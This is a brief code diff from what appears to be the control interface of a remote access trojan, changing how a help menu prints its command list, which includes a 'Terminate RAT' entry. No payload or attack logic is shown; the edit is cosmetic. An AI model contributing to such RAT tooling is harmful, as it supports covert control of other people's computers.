@@ -344,7 +344,7 @@ def run(kevbin=None):
                 ("kill", "Terminate RAT"),
             ]
             for name, desc in cmds:
-                cprint(f"  \033[96m{prefix}{name:20}\033[0m {desc}")
+                cprint(f"  \033[96m{name:20}\033[0m {desc}")
         elif choice in ('1', '2'):
             clear()
             cprint("  \033[93m\u2550"*54)
